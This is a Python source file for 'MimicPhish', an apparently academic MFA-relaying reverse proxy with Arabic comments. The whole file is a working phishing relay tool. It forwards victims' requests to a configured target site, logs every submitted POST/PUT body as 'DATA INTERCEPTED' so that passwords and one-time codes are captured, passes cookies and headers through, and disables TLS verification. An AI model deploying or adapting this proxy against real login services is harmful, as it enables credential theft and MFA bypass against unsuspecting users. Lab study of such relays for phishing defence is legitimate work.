# !/usr/bin/env python3
"""
===============================================================================
Project Name   : MimicPhish
Description    : Pure Python MFA Relaying Proxy Framework
Author         : Amani Ajlan
Field          : Cybersecurity - Academic Research & Educational Lab
===============================================================================
"""

import sys
import os
import json
import logging
import argparse
import ssl
from http.server import HTTPServer, BaseHTTPRequestHandler
from urllib.request import Request, urlopen
from urllib.error import URLError, HTTPError
from urllib.parse import urljoin, urlparse

VERSION = "1.0.0"

DEFAULT_CONFIG = {
    "listen_host": "127.0.0.1",
    "listen_port": 8080,
    "target_url": "http://127.0.0.1:5000",
    "ssl_verify": False
}


def setup_logger(log_level_str):
    """إعداد سجلات الأداة بناءً على مستوى Logging المحدد"""
    levels = {
        "DEBUG": logging.DEBUG,
        "INFO": logging.INFO,
        "WARNING": logging.WARNING,
        "ERROR": logging.ERROR
    }
    level = levels.get(log_level_str.upper(), logging.INFO)

    logging.basicConfig(
        level=level,
        format="[%(asctime)s] [%(levelname)s] %(message)s",
        datefmt="%Y-%m-%d %H:%M:%S"
    )


def load_or_create_config(config_path):
    """تحميل ملف الإعدادات أو إنشائه تلقائياً في حال عدم وجوده"""
    if not os.path.exists(config_path):
        try:
            with open(config_path, "w", encoding="utf-8") as f:
                json.dump(DEFAULT_CONFIG, f, indent=4)
            logging.info(f"تم إنشاء ملف إعدادات افتراضي جديد: {config_path}")
            return DEFAULT_CONFIG
        except PermissionError:
            logging.error(f"خطأ: لا توجد صلاحية لكتابة ملف الإعدادات في {config_path}")
            sys.exit(1)

    try:
        with open(config_path, "r", encoding="utf-8") as f:
            config = json.load(f)
            logging.info(f"تم تحميل الإعدادات بنجاح من: {config_path}")
            return config
    except json.JSONDecodeError:
        logging.error(f"خطأ: ملف الإعدادات تالف أو غير صالح (Invalid JSON): {config_path}")
        sys.exit(1)
    except PermissionError:
        logging.error(f"خطأ: لا توجد صلاحيات كافية لقراءة الملف: {config_path}")
        sys.exit(1)
    except Exception as e:
        logging.error(f"حدث خطأ غير متوقع عند قراءة الإعدادات: {str(e)}")
        sys.exit(1)


class MimicPhishPureHandler(BaseHTTPRequestHandler):
    """خادم الوسيط الاعتمادي على المكتبات القياسية فقط"""
    target_url = ""
    ssl_verify = False

    def handle_relay(self, method):
        """التقاط الطلبات وإعادة إرسالها للهدف عبر urllib"""
        try:
            # 1. قراءة محتوى الطلب (Body) في حالة POST أو PUT
            content_length = int(self.headers.get('Content-Length', 0))
            body = self.rfile.read(content_length) if content_length > 0 else None

            # 2. التقاط وتسجيل البيانات
            if method in ["POST", "PUT"] and body:
                try:
                    decoded_body = body.decode('utf-8', errors='replace')
                    logging.warning("=== [DATA INTERCEPTED] ===")
                    logging.warning(f"Method: {method} | Path: {self.path}")
                    logging.warning(f"Payload: {decoded_body}")
                    logging.warning("=" * 35)
                except Exception as log_err:
                    logging.error(f"فشل في فك تشفير البيانات: {str(log_err)}")

            # 3. بناء الرابط المستهدف
            destination_url = urljoin(self.target_url, self.path)

            # 4. تجهيز الطلب الموجه للهدف
            req = Request(destination_url, data=body, method=method)

            # 5. نسخ الهيدرز مع تعديل Host ليتناسب مع الهدف
            target_host = urlparse(self.target_url).netloc
            for key, value in self.headers.items():
                if key.lower() not in ['host', 'content-length','accept-encoding']:
                    req.add_header(key, value)
            req.add_header('Host', target_host)
            req.add_header('connection','close')

            # 6. إعداد سياق SSL لتجاوز التحقق عند الحاجة
            ssl_context = None
            if not self.ssl_verify and destination_url.startswith("https"):
                ssl_context = ssl._create_unverified_context()

            # 7. إرسال الطلب للهدف واستلام الاستجابة
            with urlopen(req, timeout=15, context=ssl_context) as response:
                response_body = response.read()

                self.send_response(response.status)

                for key, value in response.headers.items():
                    if key.lower() not in ['transfer-encoding', 'content-length']:
                        self.send_header(key, value)

                self.send_header('Content-Length', str(len(response_body)))
                self.end_headers()
                self.wfile.write(response_body)

        except HTTPError as e:
            logging.error(f"استجابة خطأ من الهدف HTTP Error: {e.code}")
            try:
                err_body = e.read()
                self.send_response(e.code)
                for key, value in e.headers.items():
                    if key.lower() not in ['transfer-encoding', 'content-length']:
                        self.send_header(key, value)
                self.send_header('Content-Length', str(len(err_body)))
                self.end_headers()
                self.wfile.write(err_body)
            except Exception:
                self.send_error(e.code, f"Target HTTP Error: {e.reason}")

        except URLError as e:
            logging.error(f"فشل الاتصال بالموقع الهدف: {e.reason}")
            self.send_error(502, "Bad Gateway: Unable to connect to target server.")
        except TimeoutError:
            logging.error("انتهت مهلة الاتصال بالهدف (Timeout).")
            self.send_error(504, "Gateway Timeout: Server took too long to respond.")
        except Exception as e:
            logging.error(f"خطأ غير متوقع في الـ Proxy: {str(e)}")
            self.send_error(500, "Internal Server Error")

    def do_GET(self):
        self.handle_relay("GET")

    def do_POST(self):
        self.handle_relay("POST")

    def do_PUT(self):
        self.handle_relay("PUT")

    def do_DELETE(self):
        self.handle_relay("DELETE")

    def log_message(self, format, *args):
        logging.info(f"Client {self.client_address[0]} - {format % args}")


def run_proxy_server(config_file, log_level):
    """إعداد وتشغيل خادم الـ Proxy"""
    setup_logger(log_level)
    logging.info(f"بدء تشغيل MimicPhish Proxy Engine (v{VERSION}) [Pure Python Mode]...")

    config = load_or_create_config(config_file)
    host = config.get("listen_host", "127.0.0.1")
    port = config.get("listen_port", 8080)
    target = config.get("target_url", "http://127.0.0.1:5000")
    ssl_verify = config.get("ssl_verify", False)

    MimicPhishPureHandler.target_url = target
    MimicPhishPureHandler.ssl_verify = ssl_verify

    try:
        server = HTTPServer((host, port), MimicPhishPureHandler)
        logging.info(f"الخادم يعمل بنجاح على: http://{host}:{port}")
        logging.info(f"يتم التوجيه إلى الهدف: {target}")
        logging.info("اضغط Ctrl+C لإيقاف الخادم.")
        server.serve_forever()
    except KeyboardInterrupt:
        logging.info("\n[!] تم إيقاف الخادم بنجاح بواسطة المستخدم.")
        sys.exit(0)
    except PermissionError:
        logging.error(f"خطأ: المنفذ {port} يتطلب صلاحيات مسؤول (Administrator/Root).")
        sys.exit(1)
    except OSError as e:
        logging.error(f"خطأ في تشغيل الخادم على المنفذ {port}: {str(e)}")
        sys.exit(1)


def main():
    """واجهة سطر الأوامر القياسية (CLI Manager)"""
    parser = argparse.ArgumentParser(
        prog="mimicphish",
        description="MimicPhish - Academic MFA Relaying Proxy Framework (Pure Python)",
        epilog="Designed strictly for cybersecurity learning and testing environments."
    )

    parser.add_argument("--version", action="version", version=f"MimicPhish v{VERSION}")

    subparsers = parser.add_subparsers(dest="command", help="الأوامر المتاحة")

    run_parser = subparsers.add_parser("run", help="تشغيل خادم الـ Reverse Proxy")
    run_parser.add_argument(
        "--config",
        default="config.json",
        help="مسار ملف الإعدادات (الافتراضي: config.json)"
    )
    run_parser.add_argument(
        "--log-level",
        default="INFO",
        choices=["DEBUG", "INFO", "WARNING", "ERROR"],
        help="مستوى ظهور السجلات (الافتراضي: INFO)"
    )

    args = parser.parse_args()

    if args.command == "run":
        run_proxy_server(args.config, args.log_level)
    else:
        parser.print_help()


if __name__ == "__main__":
    main()
